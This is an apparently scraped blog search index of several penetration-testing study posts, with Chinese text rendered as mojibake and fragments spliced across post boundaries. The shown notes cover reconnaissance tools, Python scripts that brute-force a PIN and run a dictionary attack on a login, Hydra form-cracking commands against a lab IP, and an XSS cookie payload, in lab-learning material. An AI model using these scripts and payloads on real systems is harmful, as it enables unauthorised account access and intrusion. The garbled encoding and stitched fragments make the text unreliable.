å¤§ç›®æ ‡ä¸»æœºä¸Šé˜²ç«å¢™çš„æ‹¦æˆªéš¾åº¦ï¼Œ-D RNDæŒ‡å®šç”Ÿæˆæ•°é‡çš„ä¼ªé€ çš„éšæœºIPåœ°å€ï¼Œ\u0026ndash;data-string\u0026quot;\u0026ldquo;å°†è‡ªå®šä¹‰å­—ç¬¦ä¸²ï¼ˆASCIIç ï¼‰æ’å…¥æ•°æ®åŒ…\næŒ‡çº¹è¯†åˆ« wappalyzerç«ç‹æ’ä»¶\nwhatweb ä¿®æ”¹è¯·æ±‚æ¶ˆæ¯HTTP -Hï¼šSnowwolf -Uï¼šChromeï¼Œè¯†åˆ«CMS,åšå®¢å¹³å°ï¼Œä¸­é—´ä»¶ï¼ŒWebæ¡†æ¶æ¨¡å—ï¼Œç½‘ç«™æœåŠ¡å™¨ï¼Œè„šæœ¬ï¼ŒIPï¼Œcookie\nWAFè¯†åˆ« é˜²ç«å¢™ wafw00f \u0026ndash;proxy=ä»£ç†åœ°å€\nç›®å½•æ‰«æ dirb éœ€è¦ç™»é™†åçš„ç½‘ç«™ -c â€œCookieï¼š\u0026hellip;.\u0026rdquo; éšè—æ”»å‡»è€…ä¸»æœº -a dirbuster å›¾å½¢åŒ–ç•Œé¢ gobuster ffuf -wæŒ‡å®šå­—å…¸æ–‡ä»¶ -u url Wfuzz webåº”ç”¨ç¨‹åºçš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå‘ç°Webåº”ç”¨ç¨‹åºçš„éšè—èµ„æº -wå­—å…¸æ–‡ä»¶ \u0026ndash;hc 404 url/FUZZ â€‹ æšä¸¾phpæ–‡ä»¶ FUZZ.php\nâ€‹ ä½¿ç”¨Wfuzzæšä¸¾ç”¨æˆ·åå’Œå¯†ç \nâ€‹ -f output.htmlä¿å­˜ä¸ºhtmlæ–‡ä»¶åœ¨æµè§ˆå™¨ç§æ‰“å¼€\næ¼æ´æ•°æ®åº“ searchsploit å¯ä»¥ä¸nmapè”åŠ¨ nmap url -sV -oX nmap.xml//-oXå°†æ‰«æç»“æœä¿å­˜åˆ°ä¸€ä¸ªXMLæ–‡ä»¶ä¸­ç”¨äºä¸searchsploitå·¥å…·è”åŠ¨ï¼Œè¾“å…¥searchsploit \u0026ndash;nmap nmap.xml è°·æ­ŒHackingè¯­æ³•\næ‰¹é‡å¯»æ‰¾ç½‘ç«™åå° inurlï¼š\nintextï¼š\nintitleï¼š\næŒ‡å®šç½‘ç«™å¯»æ‰¾åå° siteï¼š inurl:/intext:/intitle:\næŒ‡å®šè¿”å›æ–‡ä»¶ç±»å‹ filetypeï¼š\næ‰¹é‡å¯»æ‰¾ç›®å½•éå†æ¼æ´ intextï¼šindex of/admin\nintext:index of\næš´åŠ›æ”»å‡» ç ´è§£PINç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Try every possible 4-digit PIN (from 0000 to 9999) for pin in range(10000): formatted_pin = f\u0026#34;{pin:04d}\u0026#34; # Convert the number to a 4-digit string (e.g., 7 becomes \u0026#34;0007\u0026#34;) print(f\u0026#34;Attempted PIN: {formatted_pin}\u0026#34;) # Send the request to the server response = requests.get(f\u0026#34;http://{ip}:{port}/pin?pin={formatted_pin}\u0026#34;) # Check if the server responds with success and the flag is found if response.ok and \u0026#39;flag\u0026#39; in response.json(): # .ok means status code is 200 (success) print(f\u0026#34;Correct PIN found: {formatted_pin}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break è¿è¡Œ\npython pin-solver.py\nå­—å…¸æ”»å‡» å­—å…¸æ”»å‡»çš„æœ‰æ•ˆæ€§åœ¨äºå®ƒèƒ½å¤Ÿåˆ©ç”¨äººç±»å€¾å‘äºä¼˜å…ˆé€‰æ‹©å®¹æ˜“è®°ä½çš„å¯†ç è€Œä¸æ˜¯å®‰å…¨çš„å¯†ç è¿™ä¸€å€¾å‘ã€‚å°½ç®¡å±¡æ¬¡å—åˆ°è­¦å‘Šï¼Œä½†è®¸å¤šäººä»ç„¶é€‰æ‹©åŸºäºå­—å…¸å•è¯ã€å¸¸ç”¨çŸ­è¯­ã€åç§°æˆ–å®¹æ˜“çŒœæµ‹çš„æ¨¡å¼ç­‰ç°æˆä¿¡æ¯çš„å¯†ç ã€‚è¿™ç§å¯é¢„æµ‹æ€§ä½¿ä»–ä»¬å®¹æ˜“å—åˆ°å­—å…¸æ”»å‡»ï¼Œæ”»å‡»è€…ä¼šç³»ç»Ÿåœ°é’ˆå¯¹ç›®æ ‡ç³»ç»Ÿæµ‹è¯•é¢„å®šä¹‰çš„æ½œåœ¨å¯†ç åˆ—è¡¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Download a list of common passwords from the web and split it into lines passwords = requests.get(\u0026#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt\u0026#34;).text.splitlines() # Try each password from the list for password in passwords: print(f\u0026#34;Attempted password: {password}\u0026#34;) # Send a POST request to the server with the password response = requests.post(f\u0026#34;http://{ip}:{port}/dictionary\u0026#34;, data={\u0026#39;password\u0026#39;: password}) # Check if the server responds with success and contains the \u0026#39;flag\u0026#39; if response.ok and \u0026#39;flag\u0026#39; in response.json(): print(f\u0026#34;Correct password found: {password}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 1 python3 dictionary-solver.py Hydra ä¸º Hydra æ„å»º params å­—ç¬¦ä¸² Form Parametersï¼šè¿™äº›æ˜¯ä¿å­˜ç”¨æˆ·åå’Œå¯†ç çš„åŸºæœ¬å­—æ®µã€‚Hydra å°†åŠ¨æ€åœ°ç”¨å•è¯åˆ—è¡¨ä¸­çš„å€¼æ›¿æ¢è¿™äº›å‚æ•°ä¸­çš„å ä½ç¬¦ï¼ˆ^USER^å’Œï¼‰ã€‚^PASS^\nAdditional Fieldsï¼šå¦‚æœè¡¨å•åŒ…å«å…¶ä»–éšè—å­—æ®µæˆ–ä»¤ç‰Œï¼ˆä¾‹å¦‚ CSRF ä»¤ç‰Œï¼‰ï¼Œåˆ™å®ƒä»¬ä¹Ÿå¿…é¡»åŒ…å«åœ¨paramså­—ç¬¦ä¸²ä¸­ã€‚å¦‚æœå®ƒä»¬çš„å€¼éšæ¯æ¬¡è¯·æ±‚è€Œå˜åŒ–ï¼Œåˆ™å®ƒä»¬å¯ä»¥å…·æœ‰é™æ€å€¼æˆ–åŠ¨æ€å ä½ç¬¦ã€‚\nSuccess Conditionï¼šè¿™å®šä¹‰äº† Hydra ç”¨æ¥è¯†åˆ«æˆåŠŸç™»å½•çš„æ ‡å‡†ã€‚å®ƒå¯ä»¥æ˜¯ HTTP çŠ¶æ€ä»£ç ï¼ˆä¾‹å¦‚S=302é‡å®šå‘ï¼‰æˆ–æœåŠ¡å™¨å“åº”ä¸­ç‰¹å®šæ–‡æœ¬çš„å­˜åœ¨æˆ–ä¸å­˜åœ¨ï¼ˆä¾‹å¦‚F=Invalid credentialsæˆ–S=Welcomeï¼‰ã€‚\nHydra å‘½ä»¤çš„ä¸€èˆ¬ç»“æ„http-post-formå¦‚ä¸‹ï¼š\n1 hydra [options] target http-post-form \u0026#34;path:params:condition_string\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:S=302\u0026#34; æˆ‘ä»¬å°†ä½¿ç”¨top-usernames-shortlist.txtä½œä¸ºç”¨æˆ·ååˆ—è¡¨ï¼Œä½¿ç”¨2023-200_most_used_passwords.txtä½œä¸ºå¯†ç åˆ—è¡¨ã€‚\nä¾‹ï¼š\n1 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.63.74 -s 35392 http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; ","date":"2025-01-20T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/","title":"è„šæœ¬å°å­"},{"content":"Webåº”ç”¨ç¨‹åº ç¼ºé™· çœŸå®åœºæ™¯ SQL æ³¨å…¥ è·å– Active Directory ç”¨æˆ·åå¹¶å¯¹ VPN æˆ–ç”µå­é‚®ä»¶é—¨æˆ·æ‰§è¡Œå¯†ç å–·æ´’æ”»å‡»ã€‚ æ–‡ä»¶åŒ…å« é˜…è¯»æºä»£ç ä»¥æŸ¥æ‰¾éšè—çš„é¡µé¢æˆ–ç›®å½•ï¼Œè¿™äº›é¡µé¢æˆ–ç›®å½•å…¬å¼€äº†å¯ç”¨äºè·å–è¿œç¨‹ä»£ç æ‰§è¡Œçš„é™„åŠ åŠŸèƒ½ã€‚ ä¸å—é™åˆ¶çš„æ–‡ä»¶ä¸Šä¼  å…è®¸ç”¨æˆ·ä¸Šä¼ ä¸ªäººèµ„æ–™å›¾ç‰‡çš„ Web åº”ç”¨ç¨‹åºï¼Œå…è®¸ä¸Šä¼ ä»»ä½•ç±»å‹çš„æ–‡ä»¶ï¼ˆä¸ä»…ä»…æ˜¯å›¾ç‰‡ï¼‰ã€‚å¯ä»¥åˆ©ç”¨æ­¤åŠŸèƒ½é€šè¿‡ä¸Šä¼ æ¶æ„ä»£ç æ¥å®Œå…¨æ§åˆ¶ Web åº”ç”¨ç¨‹åºæœåŠ¡å™¨ã€‚ ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ï¼ˆIDORï¼‰ å½“ä¸è®¿é—®æ§åˆ¶å¤±æ•ˆç­‰ç¼ºé™·ç›¸ç»“åˆæ—¶ï¼Œè¿™é€šå¸¸å¯ç”¨äºè®¿é—®å…¶ä»–ç”¨æˆ·çš„æ–‡ä»¶æˆ–åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œåœ¨æµè§ˆåˆ° /user/701/edit-profile ç­‰é¡µé¢æ—¶ç¼–è¾‘æ‚¨çš„ç”¨æˆ·ä¸ªäººèµ„æ–™ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥å°† æ›´æ”¹701ä¸º702ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¼–è¾‘å…¶ä»–ç”¨æˆ·çš„ä¸ªäººèµ„æ–™ï¼ è®¿é—®æ§åˆ¶å¤±æ•ˆ å¦ä¸€ä¸ªç¤ºä¾‹æ˜¯å…è®¸ç”¨æˆ·æ³¨å†Œæ–°å¸æˆ·çš„åº”ç”¨ç¨‹åºã€‚å¦‚æœå¸æˆ·æ³¨å†ŒåŠŸèƒ½è®¾è®¡ä¸ä½³ï¼Œç”¨æˆ·å¯èƒ½ä¼šåœ¨æ³¨å†Œæ—¶æ‰§è¡Œæƒé™æå‡ã€‚è€ƒè™‘POSTæ³¨å†Œæ–°ç”¨æˆ·æ—¶çš„è¯·æ±‚ï¼Œè¯¥è¯·æ±‚æäº¤æ•°æ®username=bjones\u0026amp;password=Welcome1\u0026amp;email=bjones@inlanefreight.local\u0026amp;roleid=3ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥æ“çºµroleidå‚æ•°å¹¶å°†å…¶æ›´æ”¹ä¸º0æˆ–ä¼šæ€æ ·1ï¼Ÿæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†è¿™ç§æƒ…å†µçš„çœŸå®åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸”å¯ä»¥å¿«é€Ÿæ³¨å†Œç®¡ç†å‘˜ç”¨æˆ·å¹¶è®¿é—® Web åº”ç”¨ç¨‹åºçš„è®¸å¤šéé¢„æœŸåŠŸèƒ½ã€‚ Webç¨‹åºå¸ƒå±€ å±‚ï¼š\nç±»åˆ« æè¿° Web Application Infrastructure æè¿° Web åº”ç”¨ç¨‹åºæŒ‰é¢„æœŸè¿è¡Œæ‰€éœ€çš„ç»„ä»¶ï¼ˆå¦‚æ•°æ®åº“ï¼‰çš„ç»“æ„ã€‚ç”±äº Web åº”ç”¨ç¨‹åºå¯ä»¥è®¾ç½®ä¸ºåœ¨å•ç‹¬çš„æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œå› æ­¤äº†è§£å®ƒéœ€è¦è®¿é—®å“ªä¸ªæ•°æ®åº“æœåŠ¡å™¨è‡³å…³é‡è¦ã€‚ Web Application Components ç»„æˆ Web åº”ç”¨ç¨‹åºçš„ç»„ä»¶ä»£è¡¨ä¸ Web åº”ç”¨ç¨‹åºäº¤äº’çš„æ‰€æœ‰ç»„ä»¶ã€‚è¿™äº›ç»„ä»¶åˆ†ä¸ºä»¥ä¸‹ä¸‰ä¸ªåŒºåŸŸï¼šUI/UXã€Clientå’ŒServerç»„ä»¶ã€‚ Web Application Architecture æ¶æ„åŒ…æ‹¬å„ä¸ª Web åº”ç”¨ç¨‹åºç»„ä»¶ä¹‹é—´çš„æ‰€æœ‰å…³ç³»ã€‚ Web åº”ç”¨ç¨‹åºåŸºç¡€è®¾æ–½ Client-ServerWeb åº”ç”¨ç¨‹åºé€šå¸¸é‡‡ç”¨è¯¥client-serveræ¨¡å‹ã€‚æœåŠ¡å™¨ä»¥å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹æ‰˜ç®¡ Web åº”ç”¨ç¨‹åºï¼Œå¹¶å°†å…¶åˆ†å‘ç»™ä»»ä½•å°è¯•è®¿é—®å®ƒçš„å®¢æˆ·ç«¯ã€‚åœ¨è¿™ç§æ¨¡å‹ä¸­ï¼ŒWeb åº”ç”¨ç¨‹åºæœ‰ä¸¤ç§ç±»å‹çš„ç»„ä»¶ï¼šå‰ç«¯ç»„ä»¶ï¼Œé€šå¸¸åœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ä¸Šè§£é‡Šå’Œæ‰§è¡Œï¼›åç«¯ç»„ä»¶ï¼Œé€šå¸¸ç”±æ‰˜ç®¡æœåŠ¡å™¨ç¼–è¯‘ã€è§£é‡Šå’Œæ‰§è¡Œã€‚ One Serverå¦‚æœä»»ä½•æ‰˜ç®¡çš„ Web åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œåˆ™æ•´ä¸ª Web æœåŠ¡å™¨éƒ½ä¼šå—åˆ°æ¼æ´ã€‚ Many Servers - One Databaseæ­¤æ¨¡å‹å°†æ•°æ®åº“åˆ†ç¦»åˆ°å…¶è‡ªå·±çš„æ•°æ®åº“æœåŠ¡å™¨ä¸Šï¼Œå¹¶å…è®¸ Web åº”ç”¨ç¨‹åºçš„æ‰˜ç®¡æœåŠ¡å™¨è®¿é—®æ•°æ®åº“æœåŠ¡å™¨ä»¥å­˜å‚¨å’Œæ£€ç´¢æ•°æ®ã€‚åªè¦æ•°æ®åº“åˆ†ç¦»åœ¨å…¶è‡ªå·±çš„æ•°æ®åº“æœåŠ¡å™¨ä¸Šï¼Œå°±å¯ä»¥å°†å…¶è§†ä¸ºå¤šæœåŠ¡å™¨å¯¹ä¸€ä¸ªæ•°æ®åº“å’Œå•æœåŠ¡å™¨å¯¹ä¸€ä¸ªæ•°æ®åº“ã€‚è¿™ç§æ¨¡å‹çš„ä¸»è¦ä¼˜åŠ¿ ( from a security point of view) æ˜¯åˆ†æ®µï¼Œå…¶ä¸­ Web åº”ç”¨ç¨‹åºçš„æ¯ä¸ªä¸»è¦ç»„ä»¶éƒ½å•ç‹¬æ”¾ç½®å’Œæ‰˜ç®¡ã€‚å¦‚æœä¸€ä¸ª Web æœåŠ¡å™¨å—åˆ°æ”»å‡»ï¼Œå…¶ä»– Web æœåŠ¡å™¨ä¸ä¼šå—åˆ°ç›´æ¥å½±å“ã€‚ Many Servers - Many DatabasesWeb åº”ç”¨ç¨‹åºåªèƒ½è®¿é—®ç§æœ‰æ•°æ®å’Œè·¨ Web åº”ç”¨ç¨‹åºå…±äº«çš„å…¬å…±æ•°æ®ã€‚ä¹Ÿå¯ä»¥å°†æ¯ä¸ª Web åº”ç”¨ç¨‹åºçš„æ•°æ®åº“æ‰˜ç®¡åœ¨å…¶å•ç‹¬çš„æ•°æ®åº“æœåŠ¡å™¨ä¸Šã€‚è¿™ç§è®¾è®¡è¿˜è¢«å¹¿æ³›ç”¨äºå†—ä½™ç›®çš„ï¼Œå› æ­¤å¦‚æœä»»ä½• Web æœåŠ¡å™¨æˆ–æ•°æ®åº“è„±æœºï¼Œå¤‡ä»½å°†ä»£æ›¿å…¶è¿è¡Œï¼Œä»¥å°½å¯èƒ½å‡å°‘åœæœºæ—¶é—´ã€‚ Webåº”ç”¨ç¨‹åºç»„ä»¶ `Client\nServer\nç½‘ç»œæœåŠ¡å™¨ Web åº”ç”¨ç¨‹åºé€»è¾‘ æ•°æ®åº“ Services\nï¼ˆå¾®æœåŠ¡ï¼‰\nç¬¬ä¸‰æ–¹é›†æˆ Web åº”ç”¨ç¨‹åºé›†æˆ `Functionsï¼ˆæ— æœåŠ¡å™¨ï¼‰\næ•æ„Ÿæ•°æ®æ³„éœ² æ•æ„Ÿæ•°æ®æ³„éœ²æ˜¯æŒ‡æœ€ç»ˆç”¨æˆ·å¯ä»¥ä»¥æ˜æ–‡å½¢å¼è·å–æ•æ„Ÿæ•°æ®ctrl + u`é€šè¿‡ Web ä»£ç†ï¼ˆå¦‚ï¼‰é”®å…¥æˆ–æŸ¥çœ‹é¡µé¢æºä»£ç Burp Suite\næœ‰æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå‘ç°ç™»å½•åcredentialsã€hashesæˆ–å…¶ä»–æ•æ„Ÿæ•°æ®éšè—åœ¨ç½‘é¡µæºä»£ç çš„æ³¨é‡Šä¸­æˆ–JavaScriptæ­£åœ¨å¯¼å…¥çš„å¤–éƒ¨ä»£ç ä¸­ã€‚å…¶ä»–æ•æ„Ÿä¿¡æ¯å¯èƒ½åŒ…æ‹¬æš´éœ²çš„é“¾æ¥æˆ–ç›®å½•ï¼Œç”šè‡³æš´éœ²çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€æœ‰è¿™äº›éƒ½å¯èƒ½è¢«åˆ©ç”¨æ¥è¿›ä¸€æ­¥è®¿é—® Web åº”ç”¨ç¨‹åºæˆ– Web åº”ç”¨ç¨‹åºçš„æ”¯æŒåŸºç¡€è®¾æ–½\nHTMLæ³¨å…¥ HTML æ³¨å…¥æ˜¯æŒ‡æœªç»è¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚è¿™å¯ä»¥é€šè¿‡æ£€ç´¢ä¹‹å‰æäº¤çš„ä»£ç ï¼ˆä¾‹å¦‚ä»åç«¯æ•°æ®åº“æ£€ç´¢ç”¨æˆ·è¯„è®ºï¼‰æˆ–ç›´æ¥åœ¨JavaScriptå‰ç«¯æ˜¾ç¤ºæœªç»è¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥æ¥å®ç°ã€‚\n1 \u0026lt;a href=\u0026#34;http://www.hackthebox.com\u0026#34;\u0026gt;Click Me\u0026lt;/a\u0026gt; è·¨ç«™ç‚¹è„šæœ¬XSS HTML Injectionæ¼æ´é€šå¸¸è¿˜å¯ç”¨äºé€šè¿‡æ³¨å…¥è¦åœ¨å®¢æˆ·ç«¯æ‰§è¡Œçš„ä»£ç æ¥æ‰§è¡Œè·¨ç«™ç‚¹è„šæœ¬ (XSS)æ”»å‡»ã€‚ä¸€æ—¦æˆ‘ä»¬å¯ä»¥åœ¨å—å®³è€…çš„æœºå™¨ä¸Šæ‰§è¡Œä»£ç ï¼Œæˆ‘ä»¬å°±æœ‰å¯èƒ½è®¿é—®å—å®³è€…çš„å¸æˆ·ç”šè‡³ä»–ä»¬çš„æœºå™¨ã€‚åœ¨å®è·µä¸­ä¸éå¸¸ç›¸ä¼¼ã€‚ä½†æ˜¯ï¼Œæ¶‰åŠæ³¨å…¥ä»£ç ä»¥åœ¨å®¢æˆ·ç«¯æ‰§è¡Œæ›´é«˜çº§çš„æ”»å‡»ï¼Œè€Œä¸ä»…ä»…æ˜¯æ³¨å…¥ HTML ä»£ç ã€‚ä¸»è¦æœ‰ä¸‰ç§ç±»å‹ï¼š\nç±»å‹ æè¿° Reflected XSS å½“ç”¨æˆ·è¾“å…¥ç»è¿‡å¤„ç†ï¼ˆä¾‹å¦‚æœç´¢ç»“æœæˆ–é”™è¯¯æ¶ˆæ¯ï¼‰æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šæ—¶å‘ç”Ÿã€‚ Stored XSS å½“ç”¨æˆ·è¾“å…¥å­˜å‚¨åœ¨åç«¯æ•°æ®åº“å¹¶åœ¨æ£€ç´¢æ—¶æ˜¾ç¤ºï¼ˆä¾‹å¦‚ï¼Œå¸–å­æˆ–è¯„è®ºï¼‰æ—¶å‘ç”Ÿã€‚ DOM XSS å½“ç”¨æˆ·è¾“å…¥ç›´æ¥æ˜¾ç¤ºåœ¨æµè§ˆå™¨ä¸­å¹¶å†™å…¥HTMLDOM å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œæ˜“å—æ”»å‡»çš„ç”¨æˆ·åæˆ–é¡µé¢æ ‡é¢˜ï¼‰æ—¶å‘ç”Ÿã€‚ 1 #\u0026#34;\u0026gt;\u0026lt;img src=/ onerror=alert(document.cookie)\u0026gt; æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„cookie\nåç«¯æœåŠ¡å™¨ è½¯ä»¶\nWeb Server Database Development Framework Combinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. ç»„ä»¶\nCombinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. ç¡¬ä»¶\nHTTPå“åº”ä»£ç ï¼š\næˆåŠŸçš„å“åº” 200 OK è¯·æ±‚å·²æˆåŠŸ é‡å®šå‘æ¶ˆæ¯ 301 Moved Permanently è¯·æ±‚èµ„æºçš„ URL å·²æ°¸ä¹…æ›´æ”¹ 302 Found è¯·æ±‚èµ„æºçš„ URL å·²ä¸´æ—¶æ›´æ”¹ å®¢æˆ·ç«¯é”™è¯¯å“åº” 400 Bad Request ç”±äºè¯­æ³•æ— æ•ˆï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£è¯·æ±‚ 401 Unauthorized æœªç»èº«ä»½éªŒè¯å°è¯•è®¿é—®é¡µé¢ 403 Forbidden å®¢æˆ·ç«¯æ— æƒè®¿é—®å†…å®¹ 404 Not Found æœåŠ¡å™¨æ‰¾ä¸åˆ°è¯·æ±‚çš„èµ„æº 405 Method Not Allowed è¯·æ±‚æ–¹æ³•å·²è¢«æœåŠ¡å™¨æ‰€çŸ¥ï¼Œä½†å·²è¢«ç¦ç”¨ï¼Œæ— æ³•ä½¿ç”¨ 408 Request Timeout æŸäº›æœåŠ¡å™¨ä¼šåœ¨ç©ºé—²è¿æ¥ä¸Šå‘é€æ­¤å“åº”ï¼Œå³ä½¿å®¢æˆ·ç«¯ä¹‹å‰æ²¡æœ‰ä»»ä½•è¯·æ±‚ æœåŠ¡å™¨é”™è¯¯å“åº” 500 Internal Server Error æœåŠ¡å™¨é‡åˆ°äº†ä¸çŸ¥é“å¦‚ä½•å¤„ç†çš„æƒ…å†µ 502 Bad Gateway æœåŠ¡å™¨åœ¨ä½œä¸ºç½‘å…³è·å–å¤„ç†è¯·æ±‚æ‰€éœ€çš„å“åº”æ—¶ï¼Œæ”¶åˆ°äº†æ— æ•ˆå“åº” 504 Gateway Timeout æœåŠ¡å™¨ä½œä¸ºç½‘å…³ï¼Œæ— æ³•åŠæ—¶å¾—åˆ°å“åº” ç«¯å£æœ‰ä¸¤ç§ç±»å‹ï¼šä¼ è¾“æ§åˆ¶åè®® (TCP)å’Œç”¨æˆ·æ•°æ®æŠ¥åè®® (UDP) Port(s) Protocol 20/21 (TCP) FTP 22 (TCP) SSH 23 (TCP) Telnet 25 (TCP) SMTP 80 (TCP) HTTP 161 (TCP/UDP) SNMP 389 (TCP/UDP) LDAP 443 (TCP) SSL/TLS (HTTPS) 445 (TCP) SMB 3389 (TCP) RDP shellè¿æ¥ shellç±»å‹ æè¿° Reverse shell å¯åŠ¨ä¸æ”»å‡»ç®±ä¸Šçš„â€œç›‘å¬å™¨â€çš„è¿æ¥ã€‚ Bind shell â€œç»‘å®šâ€åˆ°ç›®æ ‡ä¸»æœºä¸Šçš„ç‰¹å®šç«¯å£å¹¶ç­‰å¾…æ¥è‡ªæˆ‘ä»¬çš„æ”»å‡»ç®±çš„è¿æ¥ã€‚ Web shell é€šè¿‡ Web æµè§ˆå™¨è¿è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œé€šå¸¸ä¸æ˜¯äº¤äº’å¼æˆ–åŠäº¤äº’å¼çš„ã€‚å®ƒè¿˜å¯ç”¨äºè¿è¡Œå•ä¸ªå‘½ä»¤ï¼ˆå³åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å¹¶ä¸Šä¼ PHPè„šæœ¬æ¥è¿è¡Œå•ä¸ªå‘½ä»¤ï¼‰ã€‚ æ¸—é€æµ‹è¯•æµç¨‹ tmux tmux new -s \u0026lt;åç§°\u0026gt;\næ‰§è¡Œå‘½ä»¤ ctrl+b+ d\né‡æ–°è¿æ¥tmux attach -t \u0026lt;åç§°\u0026gt;\ntmux lså±•ç¤ºæ‰€æœ‰ä¼šè¯\nnmap ä¾‹ï¼šnmap 10.129.42.253\nè¿è¡Œ Nmap è„šæœ¬çš„è¯­æ³•æ˜¯`nmap \u0026ndash;script ","date":"2025-01-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/","title":"Webåº”ç”¨ç¨‹åº"},{"content":" TCPæ‰«æï¼Œé»˜è®¤å¸¸ç”¨ 1 sudo nmap -sS localhost å‘ç°ä¸»æœº 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 æ‰«æé€‰é¡¹ æè¿° 10.129.2.0/24 ç›®æ ‡ç½‘ç»œèŒƒå›´ã€‚ -sn ç¦ç”¨ç«¯å£æ‰«æã€‚ -oA tnet ä»¥åç§°â€œtnetâ€å¼€å¤´çš„æ‰€æœ‰æ ¼å¼å­˜å‚¨ç»“æœã€‚ Firewall and IDS Evasionæ­¤æ‰«ææ–¹æ³•ä»…åœ¨ä¸»æœºçš„é˜²ç«å¢™å…è®¸çš„æƒ…å†µä¸‹æ‰æœ‰æ•ˆ\nç¦ç”¨ç«¯å£æ‰«æï¼Œåˆ™ä¼šå¯ç”¨ICMPæ‰«æ\næ‰«æIPåˆ—è¡¨ 1 cat hosts.lst è¿™å¯èƒ½æ„å‘³ç€å…¶ä»–ä¸»æœºç”±äºå…¶é˜²ç«å¢™é…ç½®è€Œå¿½ç•¥äº†é»˜è®¤çš„ICMP å›åº”è¯·æ±‚Nmapã€‚ç”±äºæ²¡æœ‰æ”¶åˆ°å“åº”ï¼Œå®ƒä¼šå°†è¿™äº›ä¸»æœºæ ‡è®°ä¸ºéæ´»åŠ¨çŠ¶æ€\nå¯¹é¢„å®šä¹‰åˆ—è¡¨ä½¿ç”¨ç›¸åŒçš„æ‰«ææŠ€æœ¯\n1 sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\u0026#34; \u0026#34; -f5 æ‰«æé€‰é¡¹ æè¿° -sn ç¦ç”¨ç«¯å£æ‰«æã€‚ -oA tnet ä»¥åç§°â€œtnetâ€å¼€å¤´çš„æ‰€æœ‰æ ¼å¼å­˜å‚¨ç»“æœã€‚ -iL å¯¹æä¾›çš„â€œhosts.lstâ€åˆ—è¡¨ä¸­çš„ç›®æ ‡æ‰§è¡Œå®šä¹‰çš„æ‰«æã€‚ ä¸ºäº†ç¡®ä¿å‘é€äº† ICMP å›æ˜¾è¯·æ±‚ï¼Œ\nICMP å›æ˜¾è¯·æ±‚ ( -Pn)ã€DNS è§£æ ( -n) å’Œ ARP ping æ‰«æ ( --disable-arp-ping)ã€‚ 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 1 sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace æ‰«æé€‰é¡¹ æè¿° 10.129.2.18 å¯¹ç›®æ ‡æ‰§è¡Œå®šä¹‰çš„æ‰«æã€‚ -sn ç¦ç”¨ç«¯å£æ‰«æã€‚ -oA host ä»¥åç§°â€œhostâ€å¼€å¤´çš„æ‰€æœ‰æ ¼å¼å­˜å‚¨ç»“æœã€‚ -PE ä½¿ç”¨â€œICMP Echo è¯·æ±‚â€å¯¹ç›®æ ‡æ‰§è¡Œ ping æ‰«æã€‚ --packet-trace æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ… 1 sudo nmap 10.129.2.18 -sn -oA host -PE --reason æ‰«æé€‰é¡¹ æè¿° 10.129.2.18 å¯¹ç›®æ ‡æ‰§è¡Œå®šä¹‰çš„æ‰«æã€‚ -sn ç¦ç”¨ç«¯å£æ‰«æã€‚ -oA host 